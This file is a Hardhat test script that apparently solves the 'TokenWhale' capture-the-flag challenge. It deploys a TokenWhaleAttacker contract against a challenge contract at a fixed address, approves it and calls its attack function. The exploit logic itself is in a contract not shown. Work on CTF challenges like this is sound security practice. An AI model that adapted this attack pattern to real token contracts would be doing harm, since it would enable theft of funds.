import {ethers} from "hardhat";
import {Contract, Signer} from "ethers";
import {expect} from "chai";

let accounts: Signer[];
let attacker: Signer;
let contract: Contract; // challenge contract
let transferValue = 10;
let finalValue = 1000000;

before(async function () {
    accounts = await ethers.getSigners();
    attacker = accounts[0];
    const factory = await ethers.getContractFactory("TokenWhaleChallenge", attacker);
    contract = factory.attach(`0xc4beb5157BC24eF207eBD62030737ADbE41c2871`);
});

it("solves the challenge", async function () {
    const factory = await ethers.getContractFactory("TokenWhaleAttacker", attacker);
    let attackerContract = await factory.deploy(contract.address,transferValue,finalValue);
    await contract.approve(attackerContract.address,transferValue);
    await attackerContract.attack();
});

after(async function () {
    expect(await contract.isComplete()).to.eq(true);
});